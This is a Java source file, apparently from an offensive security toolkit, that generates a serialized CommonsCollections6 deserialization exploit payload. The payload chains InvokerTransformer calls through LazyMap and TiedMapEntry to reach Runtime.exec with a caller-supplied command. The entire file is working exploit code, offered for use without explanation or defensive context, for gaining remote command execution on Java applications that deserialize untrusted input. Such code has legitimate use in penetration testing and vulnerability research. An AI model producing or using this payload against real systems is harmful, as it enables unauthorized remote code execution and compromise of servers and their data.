package org.sec.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

@SuppressWarnings("all")
public class CC6 {
    public static byte[] getPayload(String cmd) {
        try {
            Transformer transformer = new ChainedTransformer(new Transformer[]{});
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                            new Object[]{"getRuntime", new Class[]{}}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                            new Object[]{null, new Object[]{}}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
            };
            Map map = new HashMap();
            Map lazyMap = LazyMap.decorate(map, transformer);
            TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test");
            HashSet hashSet = new HashSet(1);
            hashSet.add(tiedMapEntry);
            lazyMap.remove("test");
            Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
            field.setAccessible(true);
            field.set(transformer, transformers);
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
            objectOutputStream.writeObject(hashSet);
            objectOutputStream.close();
            byte[] data = outputStream.toByteArray();
            outputStream.close();
            return data;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
